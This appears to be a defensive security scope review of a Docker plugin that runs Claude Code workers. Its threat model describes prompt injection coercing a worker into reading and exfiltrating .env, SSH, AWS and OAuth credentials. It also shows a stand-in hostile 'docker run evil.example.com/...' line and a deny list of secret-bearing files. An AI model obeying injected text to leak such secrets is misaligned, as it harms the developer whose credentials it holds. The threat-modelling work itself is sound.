# sdlc-workflows v1 Scope Review — Security

**Date:** 2026-04-19
**Reviewer:** security-architect
**Scope question:** Is the Phase-5 hardening proportionate to the v1 threat model, or have we over-engineered?
**Deliverable:** this file. Companion Archon inventory review
(`reviews/2026-04-19-v1-scope-archon-inventory.md`) was not present at
write time (polled repeatedly over ~5 minutes); Archon-native security
claims below rely on the capability table in the v1-scope brief
(verified against Archon v0.3.6) plus direct reading of
`plugins/sdlc-workflows/docker/*` and `scripts/*`. If the inventory
review lands with contradicting findings, those override anything
below that conflicts.

**Verdict:** Hardening posture is **mostly proportionate** for a
workstation MVP. Two items are arguably over-engineered (M-1 short-lived
token proxy speculation, L-2 script-ownership assertion), one is
under-engineered and **material for v1** (image-tag allowlist, M-3 from
the phase-F review), and one PR-body claim overstates reality
(prompt-injection exclude-list framed as protection when the real
control is non-propagation of host credentials).

---

## 1. Threat model — short form (v1)

The plugin runs on a developer workstation. Docker is trusted. Claude
Code (CLI) is trusted. The host user already has full filesystem and
network access — we are not defending against the host. We **are**
defending the delegated worker context from becoming a weapon pointed
back at the host.

| # | Threat | Attacker goal | Mechanism |
|---|---|---|---|
| T1 | Prompt injection in a delegated task leads to host-credential exfiltration | Steal `.env`, `.ssh/`, `.aws/` etc. via a commit or tool output | Hostile text in a command brief or in workspace files coerces Claude Code inside a worker to read and commit/upload developer secrets that leaked into `$WORKSPACE` |
| T2 | Prompt-injected worker exfiltrates the Claude OAuth token itself | Gain off-host access to the user's Claude subscription | `.credentials.json` is readable by the `sdlc` user inside the container; Claude can be coerced into `cat`-ing it and emitting its contents over stdout/git |
| T3 | Hostile workflow YAML or team manifest redirects `docker run` to an attacker-controlled image | Execute arbitrary code with the credential mount attached | A PR / dependency example / checked-in `.archon/workflows/*.yaml` sets `image: evil.example.com/worker:tag`; preprocessor emits `docker run evil.example.com/...` with `/credentials.json` mounted |
| T4 | Parallel fork/merge silently clobbers reviewed content | Bypass review by racing writes | Two parallel nodes touch the same path; `git merge -X theirs` at fan-in takes the later commit unseen |
| T5 | Resource exhaustion on dev workstation | Denial of service on the developer | Runaway Claude loop, parallel fan-out saturates CPU/RAM/disk; host becomes unusable during an otherwise benign workflow |

Out of scope for v1: lateral movement between containers (local
workstation, no multi-tenant); shared image-registry supply chain
(locally built); network egress filtering (host already has full
internet); container escape to host (accepted under Docker trust).

---

## 2. Hardening inventory

Columns: **Measure** / **Threat it defends** / **Necessary?** /
**Already provided by Docker/Claude Code/Archon/host?** /
**Verdict (KEEP / REWORK / CUT)**.

| # | Measure | Threat | Necessary? | Already provided? | Verdict |
|---|---|---|---|---|---|
| 1 | `--cap-drop=ALL` on every `docker run` | T1, T2 (blast radius if container compromised) | Yes. Default Docker capabilities include net_admin, dac_override, etc. — none are needed for Claude+git. Cheap. | No. Docker default is *not* cap-drop-ALL. Archon has no containers. | **KEEP** |
| 2 | `--security-opt no-new-privileges` | T1, T2 (defeat setuid escalation even if binary lands on disk) | Yes, cheap belt-and-braces. One flag. | No Docker default. | **KEEP** |
| 3 | UID 1001 (non-root) in base image | T1, T2 (limits filesystem damage if RCE inside container) | Yes. Running as root inside a container with a workspace bind-mount lets prompt injection chown/chmod host files. | Not guaranteed by default. Archon doesn't mandate it. | **KEEP** |
| 4 | `--memory=4g --cpus=2` caps | T5 (resource exhaustion on workstation during parallel fork/merge) | Yes. Without these, a four-node parallel workflow can starve the host. Proven in dogfood. | Docker no default. Archon's git-worktree isolation doesn't address CPU/RAM. | **KEEP** |
| 5 | Docker `HEALTHCHECK` (`claude --version`) | Operational (not security) — unhealthy images surface in `docker ps` | Marginal security value. Mostly observability. | Docker feature, we just opt in. | **KEEP** (cheap, one line, aids triage) |
| 6 | `shlex.quote` on every interpolated value in `_build_docker_run` and heredoc sentinel nonces | T3 and correctness — workspace paths, image tags, model strings, timeouts | Yes. `docker run` args come from YAML + host paths; a path with spaces or a crafted image tag without quoting is shell injection. | Nothing does this for us. | **KEEP** |
| 7 | Widened rsync exclude list (`.env`, `.ssh/`, `.aws/`, `.docker/`, `.kube/`, `.gnupg/`, `*.pem`…) on workspace seed | T1 | Yes, but framing matters (see §3). The exclude list is **the** control against T1. If a host secret never enters `$WORKSPACE`, prompt injection can't exfiltrate it. | Archon's git worktrees copy only tracked files by default, so an `archon`-launched run wouldn't pick up `.env`. Our `rsync` path pulls untracked files deliberately for "run it on my working copy" UX, which means **we re-introduce a risk Archon's model didn't have**. | **KEEP**, but acknowledge honestly |
| 8 | `chmod -R a-w /home/sdlc/.claude/{plugins,agents,skills}` at image build | T3 variant (runtime agent/skill injection via prompt) | Marginal. The risk it prevents is an attacker writing to `/home/sdlc/.claude/agents/*.md` at runtime to get picked up next invocation. Low probability, low blast (container is single-use and `--rm`). | No equivalent. But the threat is thin. | **KEEP** (cheap — two Dockerfile lines) but de-emphasise in the PR body |
| 9 | Signal trap `cleanup() { rm credentials; kill -- -$$ }` on SIGTERM/SIGINT/EXIT inside container | T2 (credential persistence if container dies abnormally) | Yes, but the file is in a `--rm` container whose filesystem is already gone. The real value is killing the child process group so `docker stop` is graceful. | Docker `--rm` removes the container filesystem on exit regardless. | **KEEP** for graceful shutdown; the credential-cleanup half is belt-and-braces |
| 10 | Three-tier credential resolver (Keychain → volume → config), mode-600 temp file, EXIT/INT/TERM host-side cleanup | T2 (minimize time credentials live on host disk) | Keychain tier is a clear UX win on Mac. Volume tier is necessary on Linux. Config tier is a reasonable escape hatch. The mode-600 temp + EXIT trap is the minimum for a file that holds an OAuth refresh token. | Archon `setup` writes its own config but does **not** solve Claude Code credential plumbing for our container (different tool, different token). | **KEEP** as a whole; see §4 for the known parallel-termination leak |
| 11 | Credential staging model (mount to `.claude-creds/`, entrypoint copies) | Works around the writable `~/.claude/` requirement of Claude Code | Necessary given the `--read-only` incompatibility. Correct choice. | Not applicable elsewhere. | **KEEP** |
| 12 | Credential freshness probe (Python heredoc in entrypoint, exit 2 on expired) | UX — specific error instead of generic `authentication_error` halfway through a run | Not a security control, a UX control. Cheap. | No. | **KEEP** |
| 13 | Rejected `--read-only` rootfs with rationale documented | Accepted risk (Claude Code needs writable `~/.claude/`) | The rejection is correct; documenting it is important. | N/A. | **KEEP** (the documentation) |
| 14 | Supply-chain pins (`ARCHON_SHA=main`, `BUN_IMAGE_TAG=oven/bun:1.2.17`, Claude CLI `2.1.107`, Ralph CLI `2.9.2`) | Build-time integrity | Pins are a genuine improvement over unpinned. But `ARCHON_SHA=main` is a **branch tip, not a pin** — it drifts on every rebuild. Comment says CI/release must pass a concrete SHA; the default does not enforce this. | No Docker/Archon default. | **REWORK** — change the default to a concrete commit SHA, or fail the build when `ARCHON_SHA` doesn't look like a 40-char hex. |
| 15 | No image-tag allowlist in `preprocess_workflow.py::transform_node` | T3 | **Missing.** `_build_docker_run` happily emits `docker run evil.example.com/x` with the credential mount. See §4. | No control elsewhere. | **MISSING — FIX BEFORE SHIP** |
| 16 | `git merge -X theirs` at parallel fan-in | (functional; but T4 is a security-adjacent risk) | This is a correctness bug, not a hardening measure. Listed here because silent clobber bypasses review signal. | Archon git-worktree doesn't mediate merges. | **REWORK** — emit a post-merge diff warning, even if the merge still happens. |

Summary: of 14 real hardening measures, **12 KEEP**, **1 REWORK**
(supply-chain pin default), **1 MISSING** (image allowlist). The
inventory is tight. We did not over-harden broadly — we over-framed in
a couple of places.

---

## 3. Over-engineering candidates

Specific claims or controls that are thinner than they appear:

1. **`chmod -R a-w` on `agents/` and `skills/`** presented as a security
   control. It's cheap, so keep it, but the real threat model does not
   have an obvious "persist agent file across `--rm` invocations"
   attacker path. This is defence-in-depth on a risk most users will
   never meet. **PR body should not lead with it as a major control.**

2. **The phase-F review's M-1 "short-lived token proxy" speculation.**
   For v1, we use Claude's OAuth refresh token directly. Building a
   token-exchange proxy is a multi-week engineering effort that solves
   a risk whose residual blast radius is "the user's personal Max
   subscription might be misused." Do not build this for v1. File the
   issue but explicitly deprioritise.

3. **L-2 "Dockerfile assertion that `/opt/sdlc-scripts/` is
   root-owned."** The files are already copied during image build
   from the plugin tree; an attacker who can tamper with that tree
   already owns the build. Adding a mode-check `RUN` is ceremony.
   **CUT the recommendation**; if tampering becomes a real pathway, it
   means we changed something else first.

4. **Credential cleanup trap inside the `--rm` container.** Docker
   deletes the container filesystem on exit anyway. The trap's real
   value is process-group termination; documenting it as "ensures
   credentials don't persist" is accurate but misleading (they
   couldn't persist in a `--rm` container even without the trap).
   Keep the code; **trim the PR body narrative** so it says
   "graceful shutdown — kills children, ensures nothing straggles"
   rather than selling it as the credential cleanup.

5. **HEALTHCHECK as a security measure.** It's operational, not
   security. Keep it, but don't count it as hardening. Already
   slightly over-framed in Phase 5 design spec sub-feature 3c.

---

## 4. Under-engineering candidates

What v1 users will realistically hit, and whether each is "must fix"
or "tolerable to defer".

| # | Gap | Realistic v1 user impact | Fix before ship? |
|---|---|---|---|
| U-1 | **No image-tag allowlist in `preprocess_workflow.py`.** Any YAML field `image: evil.example.com/foo` becomes `docker run evil.example.com/foo` with credentials mounted. `$WORKSPACE` contains the user's source tree. | High. A single malicious PR to `.archon/workflows/*.yaml` in a library example directory is enough to pwn the next run. Cheap fix: reject non-`sdlc-*` prefixes with a clear error. | **YES — fix before ship.** This is a ~10-line change and closes T3. |
| U-2 | **Credential temp file leak under parallel early termination.** EXIT trap is workflow-scoped (in the host Python wrapper), not node-scoped. If the host process crashes mid-workflow, `~/.sdlc-cred-temp.*` stays on disk. | Medium. Real on Linux where tier 2 copies to disk; zero on Mac where tier 1 uses a fresh temp each call. The temp file has mode 600 so only the owning user can read it; blast radius is "a local attacker who already has your UID can steal an OAuth refresh token that rotates." | **Defer** — justify: the file is mode-600 owned by the developer, attacker-who-already-is-you. File follow-up. |
| U-3 | **`ARCHON_SHA=main` default is a branch tip, not a pin.** Comment says CI/release must pass a SHA; nothing enforces it. A `build-base.sh` run by a user today could land on a different Archon commit than the one cited in `.pr-body-phase-f.md`'s "verified on v0.3.6" claim. | Medium. Non-reproducible builds, but no direct security compromise on v1 since users build locally from a pinned Dockerfile. | **Fix before ship** — two-line change: default the arg to a concrete SHA and have the Dockerfile reject non-hex values. |
| U-4 | **Orphan containers on loop-stage timeout.** `for` loop over `docker run` may not forward SIGTERM to the active child. A timed-out loop leaves a container running. | Medium-low. Matters for long-running multi-stage loops. Dev can `docker ps` + `docker kill` manually. | **Defer** — dev has `docker stop`. File follow-up. |
| U-5 | **Silent content clobber at fan-in via `git merge -X theirs`.** Not pure security, but a reviewer-bypass vector. | Medium. Real users will hit it on any workflow with genuine parallelism. | **Fix before ship**, minimally: run `git diff --stat` between branches pre-merge and emit a warning when both sides touched the same file. Do not upgrade to a hard failure in v1. |
| U-6 | **No warning when `$WORKSPACE` seed source contains `.env`-like files that `rsync` excluded.** The exclude list is the control for T1, but it's invisible. A user with a `.env` at the repo root never sees that their secrets were kept out. | Low. Works silently and correctly. | **Defer** — enhance UX later with "12 files excluded (secret-bearing patterns): [list]" on stderr. |
| U-7 | **Network egress is unconstrained.** Worker can POST to arbitrary internet. | Low for v1 (workstation threat model; host already has full network). | **Defer** with explicit documentation in CLAUDE-CONTEXT — already flagged as M-2 in phase-F review. |
| U-8 | **`docker run` rejects ports by omission but doesn't block `--network=host`** (we don't emit it, but YAML could inject network flags if we ever widened `transform_node`). Currently preprocessor only reads specific fields so this is structural, not a vulnerability. | None today. | Document the "preprocessor emits a fixed flag set from a fixed field whitelist" invariant in CLAUDE-CONTEXT security section so a future maintainer doesn't accidentally open it. |

**Fix-before-ship list is U-1, U-3, U-5.** The rest can defer with
justification.

---

## 5. Archon-native security we should lean on

From the verified Archon capability table in the brief (Archon v0.3.6):

- **Per-run git worktrees (`archon isolation list / cleanup`)** —
  Archon's canonical workspace isolation model. It copies tracked
  files into a fresh worktree per run. **We deliberately don't use it
  for the container seed** because we want untracked working-copy
  files included (a real user hit point — they want to run a review
  on their uncommitted work). That choice is defensible but we need
  to own it: our workspace seed is **more permissive than Archon's
  native model**, and that is why we need a broader rsync exclude
  list. The PR body currently frames the rsync excludes as pure
  hardening; it's more honest to say "we chose a looser isolation
  than Archon's default, and compensate with a denylist."

- **Archon credentials (`~/.archon/config.yaml`)** — one-tier,
  Archon-internal, for Archon's own operation. Not the same credential
  as Claude Code's OAuth. We are not duplicating it; we are solving a
  different problem (feeding Claude Code auth into a container).
  No overlap. Keep our three-tier resolver.

- **Archon `serve` has no workflow-registration endpoint** — means
  the only attack surface for workflow definitions is YAML on disk.
  **This is actually a security advantage**: there is no HTTP
  accept-a-workflow endpoint to defend. We should note in the PR
  body that our v1 trust boundary is "workflow YAML on disk, read by
  the user's own account." If Archon ever adds workflow POST, our
  preprocessor's image-tag allowlist (U-1) becomes even more
  important.

- **No container isolation in Archon** — this is why our plugin
  exists. Nothing to lean on here; we are the control.

- **SQLite-only state (`~/.archon/archon.db`)** — workflow events and
  run history live in a local SQLite file owned by the dev user. Our
  `workflows-status` reads this directly. Threat: SQLite file
  contents include run metadata and potentially command snippets; an
  attacker with read access to the user's home dir has them anyway.
  No new exposure.

**Net:** Archon gives us isolation via git worktrees (which we
deliberately widen) and trusted-only workflow authoring (which is
actually helpful). There is nothing in Archon we are duplicating;
there is nothing in Archon we are ignoring that we should not be.

---

## 6. Recommendations

### CUT (over-engineered or over-framed)

1. In PR body, **do not lead with `chmod -R a-w`** on agents/skills as
   a security control — it's belt-and-braces, not a material defence.
2. **Do not build the short-lived token proxy (phase-F M-1)** for v1.
   File as post-MVP.
3. **Do not add a Dockerfile ownership assertion for `/opt/sdlc-scripts/`
   (phase-F L-2).** Pure ceremony.
4. **Reframe credential cleanup trap narrative** as graceful shutdown,
   not credential cleanup (which `--rm` does anyway).

### KEEP (genuinely necessary, minimum viable shape)

- `--cap-drop ALL`, `--no-new-privileges`, UID 1001, memory/CPU caps.
- `shlex.quote` discipline in `_build_docker_run` + heredoc sentinels.
- Three-tier credential resolver with mode-600 temp file and
  host-side EXIT/INT/TERM cleanup.
- Credential staging via `.claude-creds/`.
- Credential freshness probe in entrypoint (UX, but keep).
- Widened rsync exclude list (with honest framing — see §5).
- HEALTHCHECK (as operational, not security).
- Signal trap for process-group termination (as graceful shutdown).
- Rejection of `--read-only` with documented rationale.

### FIX BEFORE SHIP (under-engineered and material for v1)

1. **U-1: Image-tag allowlist in `preprocess_workflow.py::transform_node`**
   (and wherever else `image:` is read). Reject image names that don't
   match a known-safe prefix (`sdlc-worker:`, `sdlc-team-*`). ~10 lines,
   closes T3. **Non-negotiable for v1.**
2. **U-3: Pin `ARCHON_SHA` to a concrete commit** in the Dockerfile
   default. Either hard-code it, or make the build fail when
   `ARCHON_SHA` is not a 40-char hex. Keeps the PR body's "verified
   against Archon v0.3.6" claim honest across rebuilds.
3. **U-5: Post-merge diff warning on fan-in.** When two parallel nodes
   both touched the same path, emit a `git diff --stat` of
   `HEAD~1..HEAD` to stderr so the user sees what was silently
   overridden. Do not upgrade to a hard failure in v1.

### DEFER (tolerable for v1 with explicit justification)

1. **U-2: Credential temp-file leak under parallel early termination.**
   Justification: file is mode-600 on the developer's own host; the
   attacker who can read it is an attacker who already has that UID.
   OAuth refresh token can be rotated by `claude /login`. File issue.
2. **U-4: Orphan containers on loop-stage timeout.** Justification:
   `docker ps` + `docker kill` is a one-line fix for the user and
   affects only long-running cycles. File issue; track in F.7.
3. **U-6: Exclude-list UX surfacing.** Justification: current
   behaviour is correct, just invisible. Cosmetic, not material.
4. **U-7: Network egress allowlist.** Justification: workstation
   threat model; host already has full network; Phase 5 spec
   explicitly defers CI/registry/scanning context where this would
   bite. **Must document in CLAUDE-CONTEXT security section** so
   users on a hardened laptop don't assume we're filtering.
5. **Phase-F M-3 image-signature verification (cosign).**
   Justification: v1 builds are local. When we ship to GHCR, this
   becomes fix-before-ship. Until then, U-1's allowlist is the
   adequate control.

### Honest-disclosure fixes for the PR body (`.pr-body-phase-f.md`)

Current claims vs. reality:

- **Line 12:** *"Security hardening — `--cap-drop ALL`,
  `--no-new-privileges`, UID 1001, memory/CPU caps, HEALTHCHECK,
  signal trap inside the container, `shlex.quote` on every
  user-string, widened rsync exclude list so a prompt-injected worker
  cannot read `.env`, `.ssh/`, `.aws/`, `.docker/`, etc."*

  **Issue:** "so a prompt-injected worker cannot read…" overstates.
  The rsync excludes stop those files from ever entering the
  container; a prompt-injected worker genuinely can't read them. So
  far, true. But **HEALTHCHECK is not security hardening** — it's
  operational. And **`chmod -R a-w` is missing** from the list though
  it is the most spec-emphasised control in the design doc, which is
  inconsistent.

  **Fix:** split the line into
  - *Blast-radius reduction:* `--cap-drop ALL`, `--no-new-privileges`,
    UID 1001, `chmod -R a-w` on baked agent/skill/plugin trees.
  - *Shell-injection hygiene:* `shlex.quote` on every interpolated
    field, heredoc sentinel nonces.
  - *Workspace-seed denylist:* widened rsync excludes for
    `.env`/`.ssh/`/`.aws/` etc. — **note deliberately broader than
    Archon's tracked-files default**, to allow working-copy review.
  - *Resource containment:* memory/CPU caps.
  - *Operational:* HEALTHCHECK, graceful SIGTERM handling via
    process-group trap.

- **Line 20:** *"`--read-only` root filesystem dropped (Phase 5).
  Claude Code writes to `~/.claude/` for plugin state; a read-only
  root made the container unusable. Compensated with `--cap-drop=ALL`,
  `--no-new-privileges`, `chmod -R a-w` on the app payload, and
  UID 1001."* — **accurate as written**. Keep.

- **Lines 36-42 "Uncaptured failure modes":** ✅ accurately disclosed.
  **Explicitly add the image-tag allowlist gap if we decide to defer
  rather than fix** — we recommend fix-before-ship, so this should
  disappear from disclosure list and appear in the summary as a
  control we added.

- **Missing disclosure:** there is **no security-relevant disclosure
  that we ship with `ARCHON_SHA=main` as the default** and rebuilds
  drift. If we don't pin before ship, disclose.

- **Missing disclosure:** there is **no mention that our workspace
  seed is deliberately looser than Archon's git-worktree isolation**.
  This is relevant to anyone comparing the two. Add one sentence.

---

## Files referenced (absolute paths)

- `/Users/stevejones/Documents/Development/ai-first-sdlc-practices/.worktrees/feature-96-sdlc-workflows/plugins/sdlc-workflows/docker/Dockerfile.base`
- `/Users/stevejones/Documents/Development/ai-first-sdlc-practices/.worktrees/feature-96-sdlc-workflows/plugins/sdlc-workflows/docker/Dockerfile.full`
- `/Users/stevejones/Documents/Development/ai-first-sdlc-practices/.worktrees/feature-96-sdlc-workflows/plugins/sdlc-workflows/docker/entrypoint.sh`
- `/Users/stevejones/Documents/Development/ai-first-sdlc-practices/.worktrees/feature-96-sdlc-workflows/plugins/sdlc-workflows/scripts/resolve_credentials.py`
- `/Users/stevejones/Documents/Development/ai-first-sdlc-practices/.worktrees/feature-96-sdlc-workflows/plugins/sdlc-workflows/scripts/preprocess_workflow.py`
- `/Users/stevejones/Documents/Development/ai-first-sdlc-practices/.worktrees/feature-96-sdlc-workflows/plugins/sdlc-workflows/skills/workflows-run/SKILL.md`
- `/Users/stevejones/Documents/Development/ai-first-sdlc-practices/.worktrees/feature-96-sdlc-workflows/docs/superpowers/specs/2026-04-17-phase5-production-hardening-design.md`
- `/Users/stevejones/Documents/Development/ai-first-sdlc-practices/.worktrees/feature-96-sdlc-workflows/docs/superpowers/specs/2026-04-19-v1-scope-review-brief.md`
- `/Users/stevejones/Documents/Development/ai-first-sdlc-practices/.worktrees/feature-96-sdlc-workflows/.pr-body-phase-f.md`
- `/Users/stevejones/Documents/Development/ai-first-sdlc-practices/.worktrees/feature-96-sdlc-workflows/reviews/2026-04-19-phase-f-security-architect.md`
- `/Users/stevejones/Documents/Development/ai-first-sdlc-practices/.worktrees/feature-96-sdlc-workflows/reviews/2026-04-19-v1-scope-archon-inventory.md` (**not present at review time**)
